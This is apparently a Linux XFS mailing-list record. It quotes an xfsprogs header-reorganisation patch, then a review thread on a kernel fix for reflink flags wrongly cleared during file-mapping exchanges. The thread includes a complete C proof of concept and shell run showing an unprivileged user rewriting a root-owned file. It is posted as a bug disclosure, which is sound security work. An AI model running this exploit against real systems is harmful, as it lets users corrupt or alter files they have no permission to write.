-> + * rest of the mapping exchanges.
-> + */
-> +
-> +/* kernel only XMI/XMD definitions */
-> +
-> +struct xfs_mount;
-> +struct kmem_cache;
-> +
-> +/*
-> + * This is the incore file mapping exchange intent log item.  It is used to log
-> + * the fact that we are exchanging mappings between two files.  It is used in
-> + * conjunction with the incore file mapping exchange done log item described
-> + * below.
-> + *
-> + * These log items follow the same rules as struct xfs_efi_log_item; see the
-> + * comments about that structure (in xfs_extfree_item.h) for more details.
-> + */
-> +struct xfs_xmi_log_item {
-> +	struct xfs_log_item		xmi_item;
-> +	atomic_t			xmi_refcount;
-> +	struct xfs_xmi_log_format	xmi_format;
-> +};
-> +
-> +/*
-> + * This is the incore file mapping exchange done log item.  It is used to log
-> + * the fact that an exchange mentioned in an earlier xmi item have been
-> + * performed.
-> + */
-> +struct xfs_xmd_log_item {
-> +	struct xfs_log_item		xmd_item;
-> +	struct xfs_xmi_log_item		*xmd_intent_log_item;
-> +	struct xfs_xmd_log_format	xmd_format;
-> +};
-> +
-> +extern struct kmem_cache	*xfs_xmi_cache;
-> +extern struct kmem_cache	*xfs_xmd_cache;
-> +
-> +struct xfs_exchmaps_intent;
-> +
-> +void xfs_exchmaps_defer_add(struct xfs_trans *tp,
-> +		struct xfs_exchmaps_intent *xmi);
-> +
-> +#endif	/* __XFS_EXCHMAPS_ITEM_H__ */
-> diff --git a/libxfs/xfs_extfree_item.h b/libxfs/xfs_extfree_item.h
-> new file mode 100644
-> index 000000000000..af1b0331f7af
-> --- /dev/null
-> +++ b/libxfs/xfs_extfree_item.h
-> @@ -0,0 +1,100 @@
-> +// SPDX-License-Identifier: GPL-2.0
-> +/*
-> + * Copyright (c) 2000,2005 Silicon Graphics, Inc.
-> + * All Rights Reserved.
-> + */
-> +#ifndef	__XFS_EXTFREE_ITEM_H__
-> +#define	__XFS_EXTFREE_ITEM_H__
-> +
-> +/* kernel only EFI/EFD definitions */
-> +
-> +struct xfs_mount;
-> +struct kmem_cache;
-> +
-> +/*
-> + * Max number of extents in fast allocation path.
-> + */
-> +#define	XFS_EFI_MAX_FAST_EXTENTS	16
-> +
-> +/*
-> + * This is the "extent free intention" log item.  It is used to log the fact
-> + * that some extents need to be free.  It is used in conjunction with the
-> + * "extent free done" log item described below.
-> + *
-> + * The EFI is reference counted so that it is not freed prior to both the EFI
-> + * and EFD being committed and unpinned. This ensures the EFI is inserted into
-> + * the AIL even in the event of out of order EFI/EFD processing. In other words,
-> + * an EFI is born with two references:
-> + *
-> + * 	1.) an EFI held reference to track EFI AIL insertion
-> + * 	2.) an EFD held reference to track EFD commit
-> + *
-> + * On allocation, both references are the responsibility of the caller. Once the
-> + * EFI is added to and dirtied in a transaction, ownership of reference one
-> + * transfers to the transaction. The reference is dropped once the EFI is
-> + * inserted to the AIL or in the event of failure along the way (e.g., commit
-> + * failure, log I/O error, etc.). Note that the caller remains responsible for
-> + * the EFD reference under all circumstances to this point. The caller has no
-> + * means to detect failure once the transaction is committed, however.
-> + * Therefore, an EFD is required after this point, even in the event of
-> + * unrelated failure.
-> + *
-> + * Once an EFD is allocated and dirtied in a transaction, reference two
-> + * transfers to the transaction. The EFD reference is dropped once it reaches
-> + * the unpin handler. Similar to the EFI, the reference also drops in the event
-> + * of commit failure or log I/O errors. Note that the EFD is not inserted in the
-> + * AIL, so at this point both the EFI and EFD are freed.
-> + */
-> +struct xfs_efi_log_item {
-> +	struct xfs_log_item	efi_item;
-> +	atomic_t		efi_refcount;
-> +	atomic_t		efi_next_extent;
-> +	struct xfs_efi_log_format efi_format;
-> +};
-> +
-> +static inline size_t
-> +xfs_efi_log_item_sizeof(
-> +	unsigned int		nr)
-> +{
-> +	return offsetof(struct xfs_efi_log_item, efi_format) +
-> +			xfs_efi_log_format_sizeof(nr);
-> +}
-> +
-> +/*
-> + * This is the "extent free done" log item.  It is used to log
-> + * the fact that some extents earlier mentioned in an efi item
-> + * have been freed.
-> + */
-> +struct xfs_efd_log_item {
-> +	struct xfs_log_item	efd_item;
-> +	struct xfs_efi_log_item *efd_efip;
-> +	uint			efd_next_extent;
-> +	struct xfs_efd_log_format efd_format;
-> +};
-> +
-> +static inline size_t
-> +xfs_efd_log_item_sizeof(
-> +	unsigned int		nr)
-> +{
-> +	return offsetof(struct xfs_efd_log_item, efd_format) +
-> +			xfs_efd_log_format_sizeof(nr);
-> +}
-> +
-> +/*
-> + * Max number of extents in fast allocation path.
-> + */
-> +#define	XFS_EFD_MAX_FAST_EXTENTS	16
-> +
-> +extern struct kmem_cache	*xfs_efi_cache;
-> +extern struct kmem_cache	*xfs_efd_cache;
-> +
-> +struct xfs_extent_free_item;
-> +
-> +void xfs_extent_free_defer_add(struct xfs_trans *tp,
-> +		struct xfs_extent_free_item *xefi,
-> +		struct xfs_defer_pending **dfpp);
-> +
-> +unsigned int xfs_efi_log_space(unsigned int nr);
-> +unsigned int xfs_efd_log_space(unsigned int nr);
-> +
-> +#endif	/* __XFS_EXTFREE_ITEM_H__ */
-> diff --git a/libxfs/xfs_ialloc.c b/libxfs/xfs_ialloc.c
-> index 91f4cdf2e4f3..a064289e1634 100644
-> --- a/libxfs/xfs_ialloc.c
-> +++ b/libxfs/xfs_ialloc.c
-> @@ -20,6 +20,7 @@
->  #include "xfs_error.h"
->  #include "xfs_bmap.h"
->  #include "xfs_trans.h"
-> +#include "xfs_icreate_item.h"
->  #include "xfs_buf_item.h"
->  #include "xfs_trace.h"
->  #include "xfs_log.h"
-> diff --git a/libxfs/xfs_icreate_item.h b/libxfs/xfs_icreate_item.h
-> new file mode 100644
-> index 000000000000..64992823108a
-> --- /dev/null
-> +++ b/libxfs/xfs_icreate_item.h
-> @@ -0,0 +1,22 @@
-> +// SPDX-License-Identifier: GPL-2.0
-> +/*
-> + * Copyright (c) 2008-2010, Dave Chinner
-> + * All Rights Reserved.
-> + */
-> +#ifndef XFS_ICREATE_ITEM_H
-> +#define XFS_ICREATE_ITEM_H	1
-> +
-> +/* in memory log item structure */
-> +struct xfs_icreate_item {
-> +	struct xfs_log_item	ic_item;
-> +	struct xfs_icreate_log	ic_format;
-> +};
-> +
-> +extern struct kmem_cache *xfs_icreate_cache;	/* inode create item */
-> +
-> +void xfs_icreate_log(struct xfs_trans *tp, xfs_agnumber_t agno,
-> +			xfs_agblock_t agbno, unsigned int count,
-> +			unsigned int inode_size, xfs_agblock_t length,
-> +			unsigned int generation);
-> +
-> +#endif	/* XFS_ICREATE_ITEM_H */
-> diff --git a/libxfs/xfs_inode_util.c b/libxfs/xfs_inode_util.c
-> index b4f556df64ed..16c4c2ccdbb8 100644
-> --- a/libxfs/xfs_inode_util.c
-> +++ b/libxfs/xfs_inode_util.c
-> @@ -20,8 +20,7 @@
->  #include "xfs_error.h"
->  #include "xfs_trace.h"
->  #include "xfs_ag.h"
-> -#include "xfs_inode_item.h"
-> -#include "iunlink.h"
-> +#include "xfs_iunlink_item.h"
->  #include "xfs_inode_item.h"
->  
->  uint16_t
-> diff --git a/libxfs/iunlink.h b/libxfs/xfs_iunlink_item.h
-> similarity index 61%
-> rename from libxfs/iunlink.h
-> rename to libxfs/xfs_iunlink_item.h
-> index 8d8032cf9326..c793cdcaccde 100644
-> --- a/libxfs/iunlink.h
-> +++ b/libxfs/xfs_iunlink_item.h
-> @@ -10,15 +10,18 @@ struct xfs_trans;
->  struct xfs_inode;
->  struct xfs_perag;
->  
-> -static inline struct xfs_inode *
-> -xfs_iunlink_lookup(struct xfs_perag *pag, xfs_agino_t agino)
-> -{
-> -	return NULL;
-> -}
-> +/* in memory log item structure */
-> +struct xfs_iunlink_item {
-> +	struct xfs_log_item	item;
-> +	struct xfs_inode	*ip;
-> +	struct xfs_perag	*pag;
-> +	xfs_agino_t		next_agino;
-> +	xfs_agino_t		old_agino;
-> +};
-> +
-> +extern struct kmem_cache *xfs_iunlink_cache;
->  
->  int xfs_iunlink_log_inode(struct xfs_trans *tp, struct xfs_inode *ip,
->  			struct xfs_perag *pag, xfs_agino_t next_agino);
-> -int xfs_iunlink_reload_next(struct xfs_trans *tp, struct xfs_buf *agibp,
-> -		xfs_agino_t prev_agino, xfs_agino_t next_agino);
->  
->  #endif	/* XFS_IUNLINK_ITEM_H */
-> diff --git a/libxfs/xfs_parent.c b/libxfs/xfs_parent.c
-> index 9420d8089e8c..992263f810f8 100644
-> --- a/libxfs/xfs_parent.c
-> +++ b/libxfs/xfs_parent.c
-> @@ -25,7 +25,7 @@
->  #include "xfs_defer.h"
->  #include "xfs_parent.h"
->  #include "xfs_trans_space.h"
-> -#include "defer_item.h"
-> +#include "xfs_attr_item.h"
->  #include "xfs_health.h"
->  #include "xfs_attr_leaf.h"
->  
-> diff --git a/libxfs/xfs_platform.h b/libxfs/xfs_platform.h
-> index 4b0069fd70d7..4f4990a20dad 100644
-> --- a/libxfs/xfs_platform.h
-> +++ b/libxfs/xfs_platform.h
-> @@ -350,7 +350,6 @@ xfs_buf_readahead(
->  #define uuid_copy(s,d)		platform_uuid_copy((s),(d))
->  #define uuid_equal(s,d)		(platform_uuid_compare((s),(d)) == 0)
->  
-> -#define xfs_icreate_log(tp, agno, agbno, cnt, isize, len, gen) ((void) 0)
->  #define xfs_sb_validate_fsb_count(sbp, nblks)		(0)
->  #define xlog_calc_iovec_len(len)		roundup(len, sizeof(uint32_t))
->  
-> diff --git a/libxfs/xfs_refcount.c b/libxfs/xfs_refcount.c
-> index 3615f747f82a..6b67308fa594 100644
-> --- a/libxfs/xfs_refcount.c
-> +++ b/libxfs/xfs_refcount.c
-> @@ -24,7 +24,7 @@
->  #include "xfs_rmap.h"
->  #include "xfs_ag.h"
->  #include "xfs_health.h"
-> -#include "defer_item.h"
-> +#include "xfs_refcount_item.h"
->  #include "xfs_rtgroup.h"
->  #include "xfs_rtrefcount_btree.h"
->  
-> diff --git a/libxfs/xfs_refcount_item.h b/libxfs/xfs_refcount_item.h
-> new file mode 100644
-> index 000000000000..0fc3f493342b
-> --- /dev/null
-> +++ b/libxfs/xfs_refcount_item.h
-> @@ -0,0 +1,82 @@
-> +// SPDX-License-Identifier: GPL-2.0+
-> +/*
-> + * Copyright (C) 2016 Oracle.  All Rights Reserved.
-> + * Author: Darrick J. Wong <darrick.wong@oracle.com>
-> + */
-> +#ifndef	__XFS_REFCOUNT_ITEM_H__
-> +#define	__XFS_REFCOUNT_ITEM_H__
-> +
-> +/*
-> + * There are (currently) two pairs of refcount btree redo item types:
-> + * increase and decrease.  The log items for these are CUI (refcount
-> + * update intent) and CUD (refcount update done).  The redo item type
-> + * is encoded in the flags field of each xfs_map_extent.
-> + *
-> + * *I items should be recorded in the *first* of a series of rolled
-> + * transactions, and the *D items should be recorded in the same
-> + * transaction that records the associated refcountbt updates.
-> + *
-> + * Should the system crash after the commit of the first transaction
-> + * but before the commit of the final transaction in a series, log
-> + * recovery will use the redo information recorded by the intent items
-> + * to replay the refcountbt metadata updates.
-> + */
-> +
-> +/* kernel only CUI/CUD definitions */
-> +
-> +struct xfs_mount;
-> +struct kmem_cache;
-> +
-> +/*
-> + * Max number of extents in fast allocation path.
-> + */
-> +#define	XFS_CUI_MAX_FAST_EXTENTS	16
-> +
-> +/*
-> + * This is the "refcount update intent" log item.  It is used to log
-> + * the fact that some reverse mappings need to change.  It is used in
-> + * conjunction with the "refcount update done" log item described
-> + * below.
-> + *
-> + * These log items follow the same rules as struct xfs_efi_log_item;
-> + * see the comments about that structure (in xfs_extfree_item.h) for
-> + * more details.
-> + */
-> +struct xfs_cui_log_item {
-> +	struct xfs_log_item		cui_item;
-> +	atomic_t			cui_refcount;
-> +	atomic_t			cui_next_extent;
-> +	struct xfs_cui_log_format	cui_format;
-> +};
-> +
-> +static inline size_t
-> +xfs_cui_log_item_sizeof(
-> +	unsigned int		nr)
-> +{
-> +	return offsetof(struct xfs_cui_log_item, cui_format) +
-> +			xfs_cui_log_format_sizeof(nr);
-> +}
-> +
-> +/*
-> + * This is the "refcount update done" log item.  It is used to log the
-> + * fact that some refcountbt updates mentioned in an earlier cui item
-> + * have been performed.
-> + */
-> +struct xfs_cud_log_item {
-> +	struct xfs_log_item		cud_item;
-> +	struct xfs_cui_log_item		*cud_cuip;
-> +	struct xfs_cud_log_format	cud_format;
-> +};
-> +
-> +extern struct kmem_cache	*xfs_cui_cache;
-> +extern struct kmem_cache	*xfs_cud_cache;
-> +
-> +struct xfs_refcount_intent;
-> +
-> +void xfs_refcount_defer_add(struct xfs_trans *tp,
-> +		struct xfs_refcount_intent *ri);
-> +
-> +unsigned int xfs_cui_log_space(unsigned int nr);
-> +unsigned int xfs_cud_log_space(void);
-> +
-> +#endif	/* __XFS_REFCOUNT_ITEM_H__ */
-> diff --git a/libxfs/xfs_rmap.c b/libxfs/xfs_rmap.c
-> index 74600c99172d..34d218de21a9 100644
-> --- a/libxfs/xfs_rmap.c
-> +++ b/libxfs/xfs_rmap.c
-> @@ -24,7 +24,7 @@
->  #include "xfs_inode.h"
->  #include "xfs_ag.h"
->  #include "xfs_health.h"
-> -#include "defer_item.h"
-> +#include "xfs_rmap_item.h"
->  #include "xfs_rtgroup.h"
->  #include "xfs_rtrmap_btree.h"
->  
-> diff --git a/libxfs/xfs_rmap_item.h b/libxfs/xfs_rmap_item.h
-> new file mode 100644
-> index 000000000000..3a99f0117f2d
-> --- /dev/null
-> +++ b/libxfs/xfs_rmap_item.h
-> @@ -0,0 +1,81 @@
-> +// SPDX-License-Identifier: GPL-2.0+
-> +/*
-> + * Copyright (C) 2016 Oracle.  All Rights Reserved.
-> + * Author: Darrick J. Wong <darrick.wong@oracle.com>
-> + */
-> +#ifndef	__XFS_RMAP_ITEM_H__
-> +#define	__XFS_RMAP_ITEM_H__
-> +
-> +/*
-> + * There are (currently) three pairs of rmap btree redo item types: map, unmap,
-> + * and convert.  The common abbreviations for these are RUI (rmap update
-> + * intent) and RUD (rmap update done).  The redo item type is encoded in the
-> + * flags field of each xfs_map_extent.
-> + *
-> + * *I items should be recorded in the *first* of a series of rolled
-> + * transactions, and the *D items should be recorded in the same transaction
-> + * that records the associated rmapbt updates.  Typically, the first
-> + * transaction will record a bmbt update, followed by some number of
-> + * transactions containing rmapbt updates, and finally transactions with any
-> + * bnobt/cntbt updates.
-> + *
-> + * Should the system crash after the commit of the first transaction but
-> + * before the commit of the final transaction in a series, log recovery will
-> + * use the redo information recorded by the intent items to replay the
-> + * (rmapbt/bnobt/cntbt) metadata updates in the non-first transaction.
-> + */
-> +
-> +/* kernel only RUI/RUD definitions */
-> +
-> +struct xfs_mount;
-> +struct kmem_cache;
-> +
-> +/*
-> + * Max number of extents in fast allocation path.
-> + */
-> +#define	XFS_RUI_MAX_FAST_EXTENTS	16
-> +
-> +/*
-> + * This is the "rmap update intent" log item.  It is used to log the fact that
-> + * some reverse mappings need to change.  It is used in conjunction with the
-> + * "rmap update done" log item described below.
-> + *
-> + * These log items follow the same rules as struct xfs_efi_log_item; see the
-> + * comments about that structure (in xfs_extfree_item.h) for more details.
-> + */
-> +struct xfs_rui_log_item {
-> +	struct xfs_log_item		rui_item;
-> +	atomic_t			rui_refcount;
-> +	atomic_t			rui_next_extent;
-> +	struct xfs_rui_log_format	rui_format;
-> +};
-> +
-> +static inline size_t
-> +xfs_rui_log_item_sizeof(
-> +	unsigned int		nr)
-> +{
-> +	return offsetof(struct xfs_rui_log_item, rui_format) +
-> +			xfs_rui_log_format_sizeof(nr);
-> +}
-> +
-> +/*
-> + * This is the "rmap update done" log item.  It is used to log the fact that
-> + * some rmapbt updates mentioned in an earlier rui item have been performed.
-> + */
-> +struct xfs_rud_log_item {
-> +	struct xfs_log_item		rud_item;
-> +	struct xfs_rui_log_item		*rud_ruip;
-> +	struct xfs_rud_log_format	rud_format;
-> +};
-> +
-> +extern struct kmem_cache	*xfs_rui_cache;
-> +extern struct kmem_cache	*xfs_rud_cache;
-> +
-> +struct xfs_rmap_intent;
-> +
-> +void xfs_rmap_defer_add(struct xfs_trans *tp, struct xfs_rmap_intent *ri);
-> +
-> +unsigned int xfs_rui_log_space(unsigned int nr);
-> +unsigned int xfs_rud_log_space(void);
-> +
-> +#endif	/* __XFS_RMAP_ITEM_H__ */
-> diff --git a/libxfs/xfs_trans_resv.c b/libxfs/xfs_trans_resv.c
-> index d15ca0427584..3a87ab154bb5 100644
-> --- a/libxfs/xfs_trans_resv.c
-> +++ b/libxfs/xfs_trans_resv.c
-> @@ -19,9 +19,14 @@
->  #include "xfs_trans.h"
->  #include "xfs_trans_space.h"
->  #include "xfs_rtbitmap.h"
-> +#include "xfs_attr_item.h"
->  #include "xfs_log.h"
-> +#include "xfs_defer.h"
-> +#include "xfs_bmap_item.h"
-> +#include "xfs_extfree_item.h"
-> +#include "xfs_rmap_item.h"
-> +#include "xfs_refcount_item.h"
->  #include "xfs_trace.h"
-> -#include "defer_item.h"
->  
->  #define _ALLOC	true
->  #define _FREE	false
-> -- 
-> 2.53.0
+> > reflink flag anyway. Later writes to those mappings take the non-reflink
+> >> write path and update blocks that should still have been protected by
+> >> CoW, which shows up as data corruption between reflink-related files and
+> >> as an rmap overlap that xfs_rmap_convert() rejects.
+> >> 
+> >> Commit a23eca88448e ("xfs: fix exchange-range reflink flag clearing
+> >> issue with INO1_WRITTEN") disabled the flag exchange for
+> >> XFS_EXCHMAPS_INO1_WRITTEN requests. Fix this variant by not exchanging
+> >> the flags at all, which subsumes that guard. Whether an inode still owns
+> >> shared blocks outside the exchanged range is not recorded in the data
+> >> fork, so answering it takes a refcount btree lookup, and
+> >> xfs_exchmaps_init_intent() has no transaction to do that with, cannot
+> >> report an error, and runs with both ILOCKs dropped in recovery. Deciding
+> >> it correctly means doing that lookup in xfs_exchrange_mappings(), which
+> >> holds both ILOCKs and a transaction and can return an error. The
+> >> conservative outcome here is that both inodes keep the reflink flag.
+> > 
+> > Or you could cross-reference the refcount btree with any mappings you
+> > find beyond i_disk_size.
+> 
+> I can do that for v2. It needs a transaction and both ILOCKs. If you 
+> would rather take the fix yourself, that is fine too, whatever you prefer.
+> 
+> > XFS_EXCHMAPS_CLEAR_INO{1,2}_REFLINK were only ever set by the decision
+> >> this patch removes, so xfs_exchmaps_clear_reflink() and the code that
+> >> consumed them are unreachable and go too. An intent logged by an older
+> >> kernel does carry the bits, but xfs_xmi_item_recover_intent() has always
+> >> masked them off with XFS_EXCHMAPS_PARAMS, and the clearing only survived
+> >> recovery because init_intent re-derived the decision. Recovering such an
+> >> intent now completes the exchange and leaves both reflink flags set.
+> >> 
+> >> The flag that xfs_exchmaps_ensure_reflink() copies to the peer inode is
+> >> now permanent until a FALLOC_FL_UNSHARE_RANGE, an xfs_scrub run or a
+> >> truncate to empty clears it. Until then that inode keeps the paths
+> >> xfs_is_cow_inode() selects, ILOCK_EXCL for buffered writes and the
+> >> -ENOTBLK bounce for unaligned direct writes, and
+> >> xchk_inode_check_reflink_iflag() preens it on every scrub.
+> >> 
+> >> Fixes: 966ceafc7a43 ("xfs: create deferred log items for file mapping exchanges")
+> >> Cc: stable@vger.kernel.org # v6.10
+> >> Assisted-by: LLM
+> > 
+> > Oh, this was all slop?  Wonderful.
+> > 
+> >> Signed-off-by: Norbert Szetei <norbert@doyensec.com>
+> >> ---
+> >> A reproducer is available on request.
+> > 
+> > POC || GTFO.  I'm not going to play 20 questions here.
+> 
+> Here is how I ran xfs_exchrange_poc:
+> 
+> $ rm -f /tmp/xfs-poc.img
+> $ truncate -s 512M /tmp/xfs-poc.img
+> $ mkfs.xfs -q /tmp/xfs-poc.img     # xfsprogs 7.x -> reflink=1 exchange=1
+> $ sudo mkdir -p /mnt/xfs-poc
+> $ sudo mount -o loop /tmp/xfs-poc.img /mnt/xfs-poc
+> $ sudo chmod 1777 /mnt/xfs-poc
+> $ sudo sh -c "head -c 4096 /dev/zero | tr '\0' 'P' > /mnt/xfs-poc/peer"
+> $ sudo chown root:root /mnt/xfs-poc/peer; sudo chmod 644 /mnt/xfs-poc/peer
+> 
+> $ cd /mnt/xfs-poc
+> $ ls -l peer; shasum peer
+> -rw-r--r-- 1 root root 4096 Oct 2 21:00 peer
+> cbe4b704043468fd92eba2e999097a40370c3e3e  peer
+> 
+> $ echo test > peer 
+> -bash: peer: Permission denied
+> 
+> $ ~/xfs_exchrange_poc
+> peer uid 0 mode 0644 size 4096, block size 4096
+> 
+> start                      peer [14]   file1 size 12288  [27] [28] [29]
+> 1 FICLONERANGE             peer [14]   file1 size 12288  [27] [14] [29]
+> 2 EXCHANGE_RANGE TO_EOF    peer [14]   file1 size  4096  [27] [14] [25]
+> 3 EXCHANGE_RANGE           peer [14]   file1 size  4096  [15] [14] [25]
+> 4 pwrite(file1, 4096)      peer [14]   file1 size  8192  [15] [14] [25]
+> 
+> peer first byte P -> X   PEER REWRITTEN
+> 
+> $ ls -l peer; shasum peer
+> -rw-r--r-- 1 root root 4096 Oct 2 21:00 peer
+> 54822846951979ed8dc8f7acad8b0edf9cec2fcb  peer
+> 
+> 
+> and the source code for xfs_exchrange_poc:
+> 
+> // SPDX-License-Identifier: GPL-2.0
+> #define _GNU_SOURCE
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <unistd.h>
+> #include <fcntl.h>
+> #include <sys/ioctl.h>
+> #include <sys/stat.h>
+> #include <sys/vfs.h>
+> #include <linux/fs.h>
+> #include <linux/fiemap.h>
+> 
+> #ifndef FICLONERANGE
+> #define FICLONERANGE _IOW(0x94, 13, struct file_clone_range)
+> #endif
+> 
+> /* fs/xfs/libxfs/xfs_fs.h */
+> struct xfs_exchange_range {
+> 	__s32		file1_fd;
+> 	__u32		pad;
+> 	__u64		file1_offset;
+> 	__u64		file2_offset;
+> 	__u64		length;
+> 	__u64		flags;
+> };
+> #define XFS_IOC_EXCHANGE_RANGE		_IOW('X', 129, struct xfs_exchange_range)
+> #define XFS_EXCHANGE_RANGE_TO_EOF	(1ULL << 0)
+> 
+> static unsigned long blksz;
+> static int peer, f1;
+> 
+> static unsigned long long phys(int fd, unsigned long long off)
+> {
+> 	struct { struct fiemap f; struct fiemap_extent e[1]; } q;
+> 
+> 	memset(&q, 0, sizeof q);
+> 	q.f.fm_start = off;
+> 	q.f.fm_length = blksz;
+> 	q.f.fm_extent_count = 1;
+> 	if (ioctl(fd, FS_IOC_FIEMAP, &q.f) || q.f.fm_mapped_extents < 1)
+> 		return 0;
+> 	return (q.e[0].fe_physical + (off - q.e[0].fe_logical)) / blksz;
+> }
+> 
+> static void show(const char *tag)
+> {
+> 	struct stat st;
+> 	int i;
+> 
+> 	fstat(f1, &st);
+> 	printf("%-26s peer [%llu]   file1 size %5lld  [", tag, phys(peer, 0),
+> 	       (long long)st.st_size);
+> 	for (i = 0; i < 3; i++)
+> 		printf("%llu%s", phys(f1, (unsigned long long)i * blksz),
+> 		       i == 2 ? "]\n" : "] [");
+> }
+> 
+> static int mkfile(const char *name, char fill, int blocks)
+> {
+> 	char *buf;
+> 	int fd;
+> 
+> 	unlink(name);
+> 	fd = open(name, O_RDWR | O_CREAT | O_EXCL, 0600);
+> 	if (fd < 0)
+> 		return fprintf(stderr, "open %s: %m\n", name), -1;
+> 	buf = malloc(blocks * blksz);
+> 	memset(buf, fill, blocks * blksz);
+> 	if (pwrite(fd, buf, blocks * blksz, 0) != (ssize_t)(blocks * blksz))
+> 		return fprintf(stderr, "pwrite %s: %m\n", name), -1;
+> 	free(buf);
+> 	fsync(fd);
+> 	return fd;
+> }
+> 
+> int main(void)
+> {
+> 	struct xfs_exchange_range xr;
+> 	struct file_clone_range cr;
+> 	char before[65536], after[65536], *buf;
+> 	struct statfs sfs;
+> 	struct stat st;
+> 	int d1, d2;
+> 
+> 	if (statfs(".", &sfs))
+> 		return fprintf(stderr, "statfs: %m\n"), 2;
+> 	if (sfs.f_type != 0x58465342)	/* XFS_SUPER_MAGIC */
+> 		return fprintf(stderr,
+> 			"this directory is not on XFS (statfs type 0x%lx)\n",
+> 			(unsigned long)sfs.f_type), 2;
+> 	blksz = sfs.f_bsize;
+> 	if (blksz < 512 || blksz > 65536)
+> 		return fprintf(stderr, "unexpected block size %lu\n", blksz), 2;
+> 
+> 	peer = open("peer", O_RDONLY);
+> 	if (peer < 0)
+> 		return fprintf(stderr, "open peer: %m\n"), 2;
+> 	syncfs(peer);		/* so FIEMAP reports peer's real blocks */
+> 	fstat(peer, &st);
+> 	printf("peer uid %u mode %04o size %lld, block size %lu\n\n",
+> 	       st.st_uid, st.st_mode & 07777, (long long)st.st_size, blksz);
+> 	if (pread(peer, before, blksz, 0) != (ssize_t)blksz)
+> 		return fprintf(stderr, "read peer: %m\n"), 2;
+> 
+> 	f1 = mkfile("file1", 'A', 3);
+> 	d1 = mkfile("donor1", 'B', 1);
+> 	d2 = mkfile("donor2", 'C', 1);
+> 	if (f1 < 0 || d1 < 0 || d2 < 0)
+> 		return 2;
+> 	show("start");
+> 
+> 	/* 1. share peer's block into the middle of file1 */
+> 	cr = (struct file_clone_range){ .src_fd = peer, .src_offset = 0,
+> 					.src_length = blksz,
+> 					.dest_offset = blksz };
+> 	if (ioctl(f1, FICLONERANGE, &cr))
+> 		return fprintf(stderr, "FICLONERANGE: %m\n"), 2;
+> 	show("1 FICLONERANGE");
+> 
+> 	/*
+> 	 * 2. exchange file1's last block against the whole of donor1 with
+> 	 * TO_EOF.  The sizes are exchanged too, so file1 claims one block
+> 	 * while still owning three.  file2_offset is block 2, so this exchange
+> 	 * cannot clear a reflink flag.
+> 	 */
+> 	xr = (struct xfs_exchange_range){ .file1_fd = d1, .file1_offset = 0,
+> 					  .file2_offset = 2 * blksz,
+> 					  .length = 0,
+> 					  .flags = XFS_EXCHANGE_RANGE_TO_EOF };
+> 	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+> 		return fprintf(stderr, "EXCHANGE_RANGE TO_EOF: %m\n"), 2;
+> 	show("2 EXCHANGE_RANGE TO_EOF");
+> 
+> 	/*
+> 	 * 3. by i_disk_size this is a whole-file exchange of two one-block
+> 	 * files, so the reflink flag is handed to donor2 and cleared off
+> 	 * file1, which still shares a block with peer.
+> 	 */
+> 	xr = (struct xfs_exchange_range){ .file1_fd = d2, .file1_offset = 0,
+> 					  .file2_offset = 0, .length = blksz };
+> 	if (ioctl(f1, XFS_IOC_EXCHANGE_RANGE, &xr))
+> 		return fprintf(stderr, "EXCHANGE_RANGE: %m\n"), 2;
+> 	show("3 EXCHANGE_RANGE");
+> 
+> 	/* 4. write to the block file1 still shares with peer */
+> 	buf = malloc(blksz);
+> 	memset(buf, 'X', blksz);
+> 	if (pwrite(f1, buf, blksz, blksz) != (ssize_t)blksz)
+> 		return fprintf(stderr, "pwrite: %m\n"), 2;
+> 	fsync(f1);
+> 	show("4 pwrite(file1, 4096)");
+> 
+> 	posix_fadvise(peer, 0, 0, POSIX_FADV_DONTNEED);
+> 	if (pread(peer, after, blksz, 0) != (ssize_t)blksz)
+> 		return fprintf(stderr, "re-read peer: %m\n"), 2;
+> 	printf("\npeer first byte %c -> %c   %s\n", before[0], after[0],
+> 	       memcmp(before, after, blksz) ? "PEER REWRITTEN" : "peer intact");
+> 	return memcmp(before, after, blksz) ? 0 : 1;
+> }
+> 
+> 
+> N.
+> 
+> 
+> > --D
+> > 
+> >> fs/xfs/libxfs/xfs_exchmaps.c | 86 +++++-------------------------------
+> >> 1 file changed, 10 insertions(+), 76 deletions(-)
+> >> 
+> >> diff --git a/fs/xfs/libxfs/xfs_exchmaps.c b/fs/xfs/libxfs/xfs_exchmaps.c
+> >> index 6a66b6075e0a..07288f4163b3 100644
+> >> --- a/fs/xfs/libxfs/xfs_exchmaps.c
+> >> +++ b/fs/xfs/libxfs/xfs_exchmaps.c
+> >> @@ -127,9 +127,7 @@ xmi_has_more_exchange_work(const struct xfs_exchmaps_intent *xmi)
+> >> static inline bool
+> >> xmi_has_postop_work(const struct xfs_exchmaps_intent *xmi)
+> >> {
+> >> - return xmi->xmi_flags & (XFS_EXCHMAPS_CLEAR_INO1_REFLINK |
+> >> -  XFS_EXCHMAPS_CLEAR_INO2_REFLINK |
+> >> -  __XFS_EXCHMAPS_INO2_SHORTFORM);
+> >> + return xmi->xmi_flags & __XFS_EXCHMAPS_INO2_SHORTFORM;
+> >> }
+> >> 
+> >> /* Check all mappings to make sure we can actually exchange them. */
+> >> @@ -525,18 +523,6 @@ xfs_exchmaps_link_to_sf(
+> >> return error;
+> >> }
+> >> 
+> >> -/* Clear the reflink flag after an exchange. */
+> >> -static inline void
+> >> -xfs_exchmaps_clear_reflink(
+> >> - struct xfs_trans *tp,
+> >> - struct xfs_inode *ip)
+> >> -{
+> >> - trace_xfs_reflink_unset_inode_flag(ip);
+> >> -
+> >> - ip->i_diflags2 &= ~XFS_DIFLAG2_REFLINK;
+> >> - xfs_trans_log_inode(tp, ip, XFS_ILOG_CORE);
+> >> -}
+> >> -
+> >> /* Finish whatever work might come after an exchange operation. */
+> >> static int
+> >> xfs_exchmaps_do_postop_work(
+> >> @@ -557,16 +543,6 @@ xfs_exchmaps_do_postop_work(
+> >> return error;
+> >> }
+> >> 
+> >> - if (xmi->xmi_flags & XFS_EXCHMAPS_CLEAR_INO1_REFLINK) {
+> >> - xfs_exchmaps_clear_reflink(tp, xmi->xmi_ip1);
+> >> - xmi->xmi_flags &= ~XFS_EXCHMAPS_CLEAR_INO1_REFLINK;
+> >> - }
+> >> -
+> >> - if (xmi->xmi_flags & XFS_EXCHMAPS_CLEAR_INO2_REFLINK) {
+> >> - xfs_exchmaps_clear_reflink(tp, xmi->xmi_ip2);
+> >> - xmi->xmi_flags &= ~XFS_EXCHMAPS_CLEAR_INO2_REFLINK;
+> >> - }
+> >> -
+> >> return 0;
+> >> }
+> >> 
